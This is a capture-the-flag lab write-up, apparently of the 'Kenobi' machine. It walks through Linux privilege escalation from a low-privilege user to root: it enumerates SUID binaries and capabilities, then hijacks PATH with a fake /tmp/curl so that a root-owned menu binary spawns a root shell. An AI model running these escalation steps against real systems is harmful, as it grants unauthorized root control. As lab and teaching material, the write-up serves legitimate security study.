# Day 4 – Privilege Escalation

## 🎯 Objective
Escalate privileges from the `kenobi` user account to `root` on the target machine.

---

## 🔍 Enumeration

After obtaining a shell as `kenobi`, several privilege escalation checks were performed:

### 1. SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```
**Finding:** `/usr/bin/pkexec` had the SUID bit set.

---

### 2. Capabilities
```bash
getcap -r / 2>/dev/null
```
**Finding:** No dangerous capabilities identified.

---

### 3. Writable Directories
```bash
find / -writable -type d 2>/dev/null | grep -v proc
```
**Finding:** `/tmp` was writable.

---

### 4. Interesting Binaries
```bash
ls -l /usr/bin/menu
```
**Finding:** Owned by root and executable → became the escalation vector.

---

## ⚡ Attempted Vectors

- **pkexec exploit:**  
  Attempted to compile/run a PoC, but it required valid authentication → not viable.  

- **Path Hijacking in `/usr/bin/menu`:**  
  The binary calls system utilities (`curl`, `ifconfig`, etc.) **without absolute paths**.

---

## 💥 Exploitation

By hijacking the `$PATH` variable and placing a malicious `curl` binary in `/tmp`, root execution was achieved:

```bash
echo /bin/sh > /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

When selecting **option 1 (status check)**, the program invoked `/tmp/curl`, dropping to a root shell.

---

## ✅ Result

```bash
# whoami
root

# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```

**Privilege escalation was successful.**
